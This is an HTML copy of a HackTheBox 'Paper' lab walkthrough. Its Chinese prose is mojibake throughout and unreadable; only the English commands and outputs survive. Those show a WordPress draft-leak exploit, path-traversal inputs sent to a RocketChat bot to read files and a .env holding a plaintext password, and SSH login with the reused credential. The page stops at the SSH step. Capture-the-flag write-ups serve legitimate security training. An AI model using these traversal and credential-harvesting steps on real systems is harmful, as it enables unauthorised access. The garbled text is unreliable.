<html>
<head>
<title>Paper from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„è®ºæ–‡â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/paper-from-hackthebox-detailed-walkthrough-8afa8de0ff3e?source=collection_archive---------3-----------------------#2022-06-18">https://infosecwriteups.com/paper-from-hackthebox-detailed-walkthrough-8afa8de0ff3e?source=collection_archive---------3-----------------------#2022-06-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="df51" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</h2></div><h1 id="9afe" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/18dbc38ec5fe49e6db1840f035ee0024.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*7YKWjP6W6SUhWRUR.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">é»‘å®¢ç›’å­é‡Œçš„çº¸</figcaption></figure><p id="4df1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">çº¸æ˜¯ä¸€ç§ç®€å•çš„æœºå™¨ã€‚å®ƒå¤§è‡´ä»¥ç¾ç‰ˆç”µè§†å‰§ã€ŠåŠå…¬å®¤ã€‹ä¸ºä¸»é¢˜ã€‚æˆ‘ä»¬é¦–å…ˆé€šè¿‡æšä¸¾æ¥æ‰¾åˆ°ä¸€ä¸ªåŸŸï¼Œè¿™å°†æˆ‘ä»¬å¸¦åˆ°ä¸€ä¸ªWordPressç«™ç‚¹ï¼Œä¸€ä¸ªå…¬å…±æ¼æ´è¢«ç”¨æ¥æ­ç¤ºéšè—çš„è‰ç¨¿ã€‚ä»é‚£é‡Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå­åŸŸä¸Šçš„èŠå¤©æœåŠ¡å™¨ï¼Œä¸€ä¸ªæ³¨å†ŒURLç»™äº†æˆ‘ä»¬ä¸€ä¸ªè·å¾—è®¿é—®æƒé™çš„æ–¹æ³•ã€‚åœ¨RocketChatä¸Šä¸æœºå™¨äººäº¤äº’å…è®¸æˆ‘ä»¬ä½¿ç”¨è·¯å¾„éå†æ¥è¯»å–ç›®æ ‡åŒºåŸŸä¹‹å¤–çš„æ–‡ä»¶ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†SSHè®¿é—®çš„å‡­è¯ï¼Œå¹¶é€šè¿‡åˆ©ç”¨Pwnkitæ¼æ´è·å¾—äº†rootç”¨æˆ·ã€‚</p><p id="4ff5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯åŸºæœ¬çš„ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯åˆ©ç”¨å…¬å…±èµ„æºï¼Œå¹¶å……åˆ†åˆ©ç”¨å®ƒä»¬ã€‚</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/429" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">çº¸å¼ â€”ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="b298" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="36d1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/95601c30b13a6d390a7dca6eb33cfe22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rYaQC9g4S_6Nzycm-riYPg.png"/></div></div></figure><h1 id="c34f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç½‘ç»œæœåŠ¡å™¨</h1><p id="1b99" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ä»ç½‘ç»œæœåŠ¡å™¨å¼€å§‹ã€‚ç«¯å£80å’Œ443å°†æˆ‘ä»¬å¸¦åˆ°åŒä¸€ä¸ªæµ‹è¯•é¡µé¢:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/8df9562ef58da701a20da10af4e7e3fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Kf1bXwfPYjq7GBjD.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">webæœåŠ¡å™¨æµ‹è¯•é¡µé¢</figcaption></figure><h1 id="279f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">x-åç«¯-æœåŠ¡å™¨</h1><p id="24e1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç”¨curl Xçœ‹æ ‡é¢˜-Backend-Serverè®¾ç½®ä¸ºoffice.paper:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d795" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# curl -s -v http://10.10.11.143 &gt;/dev/null<br/>*   Trying 10.10.11.143:80...<br/>* Connected to 10.10.11.143 (10.10.11.143) port 80 (#0)<br/>&gt; GET / HTTP/1.1<br/>&gt; Host: 10.10.11.143<br/>&gt; User-Agent: curl/7.81.0<br/>&gt; Accept: */*<br/>&gt; <br/>* Mark bundle as not supporting multiuse<br/>&lt; HTTP/1.1 403 Forbidden<br/>&lt; Date: Sun, 06 Feb 2022 16:36:56 GMT<br/>&lt; Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9<br/>&lt; X-Backend-Server: office.paper<br/>&lt; Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT<br/>&lt; ETag: "30c0b-5c5c7fdeec240"<br/>&lt; Accept-Ranges: bytes<br/>&lt; Content-Length: 199691<br/>&lt; Content-Type: text/html; charset=UTF-8<br/>&lt; <br/>{ [954 bytes data]<br/>* Connection #0 to host 10.10.11.143 left intact</span></pre><p id="a6a7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å°†å®ƒæ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸»æœºæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e4b2" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# echo "10.10.11.143 office.paper" &gt;&gt; /etc/hosts</span></pre><h1 id="869b" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åŠå…¬å®¤ç½‘ç«™</h1><p id="269d" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨è®¿é—®ç½‘å€:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ns"><img src="../Images/7ef04906fce88be90d03d01d486b2a7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*X-L7P4iS0uvnM4Hi.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Office.paperç½‘ç«™</figcaption></figure><p id="7255" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">é™¤äº†è¿™ç¯‡æ–‡ç« å’Œå¯¹å®ƒçš„è¯„è®ºï¼Œç½‘ç«™ä¸Šæ²¡æœ‰ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nt"><img src="../Images/18bb4b5720702a5547ee0597689fad41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*cNbczmHFbrdzJ6-M.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">åœ¨ç½‘ç«™ä¸Šæä¾›çº¿ç´¢çš„è¯„è®º</figcaption></figure><p id="50dc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å°¼å…‹å‘Šè¯‰ç®¡ç†å‘˜åˆ é™¤ä»–çš„è‰ç¨¿ã€‚</p><h1 id="64c9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Wordpressæ¼æ´</h1><p id="47f7" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">å¦‚æœä½ çœ‹çœ‹è¿™ä¸ªé¡µé¢çš„æºä»£ç ï¼Œä½ ä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªWordPressç½‘ç«™ã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Feroxbusterè¿›è¡Œæ£€æŸ¥:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="c5e0" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# feroxbuster --url http://office.paper                       <br/> ___  ___  __   __     __      __         __   ___<br/>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br/>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br/>by Ben "epi" Risher ğŸ¤“                 ver: 2.4.1<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/> ğŸ¯  Target Url            â”‚ http://office.paper<br/> ğŸš€  Threads               â”‚ 50<br/> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br/> ğŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br/> ğŸ’¥  Timeout (secs)        â”‚ 7<br/> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.4.1<br/> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml<br/> ğŸ”ƒ  Recursion Depth       â”‚ 4<br/> ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>301        7l       20w      239c http://office.paper/wp-content<br/>301        7l       20w      237c http://office.paper/wp-admin<br/>301        7l       20w      240c http://office.paper/wp-includes<br/>&lt;SNIP&gt;</span></pre><p id="de2b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae nu" href="https://smartwp.com/check-wordpress-version/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å‘æ‚¨å±•ç¤ºäº†è¦è·å¾—ç‰ˆæœ¬å·è¿˜éœ€è¦åšäº›ä»€ä¹ˆ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9e5b" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# curl -s http://office.paper | grep "generator"<br/>&lt;meta name="generator" content="WordPress 5.2.3" /&gt;</span></pre><h1 id="bbf1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Searchsploit</h1><p id="4dcd" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨ä½¿ç”¨searchsploitæŸ¥æ‰¾æ¼æ´:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nv"><img src="../Images/516984154087a5b581759f843c56da9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*76ui1g3q6ONBENpCg22S_A.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æœç´¢WordPressçš„loitæ£€æŸ¥</figcaption></figure><p id="0b73" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬è¦æ‰¾çš„:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a2ee" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# searchsploit -m multiple/webapps/47690.md<br/>  Exploit: WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts<br/>      URL: https://www.exploit-db.com/exploits/47690<br/>     Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.md<br/>File Type: ASCII text<br/>Copied to: /root/htb/paper/47690.md<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# cat 47690.md                      <br/>So far we know that adding `?static=1` to a wordpress URL should leak its secret content<br/>Here are a few ways to manipulate the returned entries:<br/>- `order` with `asc` or `desc`<br/>- `orderby`<br/>- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format<br/>In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&amp;order=asc` will show the secret content:</span></pre><h1 id="5855" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">html 2æ–‡æœ¬</h1><p id="15a5" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥æŠŠstatic=1ä½œä¸ºä¸€ä¸ªå‚æ•°æ¥æŸ¥çœ‹è¿™ä¸ªç§˜å¯†ã€‚ä½¿ç”¨html2textä½¿å…¶åœ¨ç»ˆç«¯ä¸­æ›´å…·å¯è¯»æ€§:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1949" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# apt install html2text             <br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>html2text is already the newest version (1.3.2a-28).<br/>0 upgraded, 0 newly installed, 0 to remove and 135 not upgraded.</span></pre><h1 id="8f3d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æŸ¥çœ‹Wordpressè‰ç¨¿</h1><p id="021b" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨ç”¨curlæŠ“ä½è¿™ä¸ªç§˜å¯†ï¼Œå¹¶ä¼ é€’ç»™html2textæ¥é˜…è¯»å®ƒ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a785" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# curl -s http://office.paper/?static=1 | html2text<br/>Skip_to_content<br/>[Blunder_Tiffin_Inc.]<br/>******_Blunder_Tiffin_Inc._******<br/>The_best_paper_company_in_the_electric-city_Scranton!<br/>&lt;SNIP&gt;<br/># Warning for Michael<br/>Michael, you have to stop putting secrets in the drafts. It is a huge security<br/>issue and you have to stop doing it. -Nick<br/>Threat Level Midnight<br/>A MOTION PICTURE SCREENPLAY,<br/>WRITTEN AND DIRECTED BY<br/>MICHAEL SCOTT<br/>[INT:DAY]<br/>Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His<br/>robotic butler Dwigtâ€¦.<br/># Secret Registration URL of new Employee chat system<br/>http://chat.office.paper/register/8qozr226AhkCHZdyY<br/># I am keeping this draft unpublished, as unpublished drafts cannot be accessed<br/>by outsiders. I am not that ignorant, Nick.<br/># Also, stop looking at my drafts. Jeez!<br/>&lt;SNIP&gt;</span></pre><p id="d8d4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰«ævhostsæ¥æ‰¾åˆ°è¯¥å­åŸŸ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1aff" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://office.paper<br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:          http://office.paper<br/>[+] Method:       GET<br/>[+] Threads:      100<br/>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br/>[+] User Agent:   gobuster/3.1.0<br/>[+] Timeout:      10s<br/>===============================================================<br/>2022/02/06 16:47:28 Starting gobuster in VHOST enumeration mode<br/>===============================================================<br/>Found: chat.office.paper (Status: 200) [Size: 223163]<br/>&lt;SNIP&gt;</span></pre><h1 id="4842" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Rocketchat</h1><p id="dce7" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">è®©æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­å°è¯•æ³¨å†ŒURL:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi gj"><img src="../Images/b908b0d5b30c68cf71485739b8e2be6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gi1afHbsYncLkZTE.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Rocketchatæ³¨å†Œå¸æˆ·</figcaption></figure><p id="08c4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ³¨å†Œä¸€ä¸ªæ–°å¸æˆ·å¹¶é€‰æ‹©ç”¨æˆ·å:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/5a8b5c16a33d8d7338f4ac0edc2498f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/format:webp/0*PXg7HNcqPVOaXAFi.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Rocketchatæ³¨å†Œç”¨æˆ·å</figcaption></figure><p id="c66c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬åœ¨è¿™é‡Œç»“æŸ:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/935451cb6054d615e8c4048cfcb70a80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FZY0Xij7bzymAN7o.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Rocketchatä¸»é¡µ</figcaption></figure><p id="79f6" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å”¯ä¸€å¯ç”¨çš„èŠå¤©æ˜¯å¸¸è§„ï¼Œç‚¹å‡»å®ƒæŸ¥çœ‹è®¨è®º:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/7494eec6a69e09d44979583b6ec16800.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*y5cjVfO4JJZYeZNK.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">åœ¨ä¸€èˆ¬è®¨è®ºä¸­èŠå¤©</figcaption></figure><p id="8998" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç‚¹å‡»â€œå›æ”¶å·¥å…·â€,ç„¶åç‚¹å‡»â€œä¿¡æ¯â€,ä¸æœºå™¨äººèŠå¤©:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/3c445a5940a2757a4bfdf09fe4157319.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/0*lSqshhY8t90Ayaky.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">å›æ”¶åˆ©ç”¨æ¦‚å†µ</figcaption></figure><p id="8e87" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™ä¸ªæœºå™¨äººåŸºäº<a class="ae nu" href="https://hubot.github.com/" rel="noopener ugc nofollow" target="_blank"> hubot </a>ã€‚å¦‚æœæˆ‘é”®å…¥listï¼Œæˆ‘ä¼šçœ‹åˆ°é”€å”®æ–‡ä»¶å¤¹çš„å†…å®¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1d5d" class="nn kg iq nj b gy no np l nq nr">list<br/><br/>Fetching the directory listing of /sales/<br/>drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale<br/>drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2</span></pre><p id="34a9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œä½†æ˜¯æ‚¨å¯ä»¥è¿›è¡Œè·¯å¾„éå†æ¥æŸ¥çœ‹å…¶ä»–æ–‡ä»¶å¤¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f554" class="nn kg iq nj b gy no np l nq nr">list sale/../../../../<br/><br/>Fetching the directory listing of sale/../../../../<br/>-rw-r--r-- 1 root root 0 Jan 14 06:07 .autorelabel<br/>lrwxrwxrwx 1 root root 7 Jun 22 2021 bin -&gt; usr/bin<br/>dr-xr-xr-x. 4 root root 4096 Jan 14 06:46 boot<br/>drwxr-xr-x 20 root root 3020 Feb 6 09:40 dev<br/>drwxr-xr-x. 145 root root 8192 Feb 6 09:40 etc<br/>drwxr-xr-x. 3 root root 20 Jan 14 06:50 home<br/>lrwxrwxrwx 1 root root 7 Jun 22 2021 lib -&gt; usr/lib<br/>lrwxrwxrwx. 1 root root 9 Jun 22 2021 lib64 -&gt; usr/lib64<br/>drwxr-xr-x. 2 root root 6 Jun 22 2021 media<br/>drwxr-xr-x. 3 root root 18 Jun 22 2021 mnt&lt;<br/>&lt;SNIP&gt;</span></pre><p id="3de4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ çœ‹çœ‹å¾·æ€€ç‰¹çš„å®¶ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªåä¸ºhubotçš„æ–‡ä»¶å¤¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="ff78" class="nn kg iq nj b gy no np l nq nr">list sale/../../../../home/dwight<br/><br/>Fetching the directory listing of sale/../../../../home/dwight<br/>&lt;SNIP&gt;<br/>-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh<br/>drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot<br/>-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history</span></pre><p id="7f75" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æŸ¥çœ‹hubotæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬æœ‰è®¸å¤šæ–‡ä»¶:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d888" class="nn kg iq nj b gy no np l nq nr">list sale/../../hubot/<br/><br/>Fetching the directory listing of sale/../../hubot/<br/>drwx--x--x 2 dwight dwight 36 Sep 16 07:34 bin<br/>-rw-r--r-- 1 dwight dwight 258 Sep 16 07:57 .env<br/>-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json<br/>drwx------ 8 dwight dwight 163 Jul 3 2021 .git<br/>-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore<br/>-rw-r--r-- 1 dwight dwight 296856 Feb 6 15:01 .hubot.log</span></pre><p id="17f1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ–‡ä»¶è€Œä¸æ˜¯åˆ—è¡¨æ¥æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ã€‚è¿™æ˜¯ã€‚envæ–‡ä»¶æˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶å¤¹ä¸­çœ‹åˆ°:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="6dd5" class="nn kg iq nj b gy no np l nq nr">file sale/../../hubot/.env<br/><br/>&lt;!=====Contents of file sale/../../hubot/.env=====&gt;<br/>export ROCKETCHAT_URL='http://127.0.0.1:48320'<br/>export ROCKETCHAT_USER=recyclops<br/>export ROCKETCHAT_PASSWORD=Queenofblad3s!23<br/>export ROCKETCHAT_USESSL=false<br/>export RESPOND_TO_DM=true<br/>export RESPOND_TO_EDITED=true<br/>export PORT=8000<br/>export BIND_ADDRESS=127.0.0.1<br/>&lt;!=====End of file sale/../../hubot/.env=====&gt;</span></pre><h1 id="8be7" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSHè®¿é—®</h1><p id="6a9c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æˆ‘ä»¬æœ‰ä¸€äº›å‡­è¯ï¼Œå‘ç°dwightåœ¨SSHè®¿é—®ä¸­é‡ç”¨äº†è¿™äº›å‡­è¯:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e445" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# ssh dwight@office.paper                  <br/>dwight@office.paper's password: <br/>Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23<br/>[dwight@paper ~]$</span></pre><h1 id="06d6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz 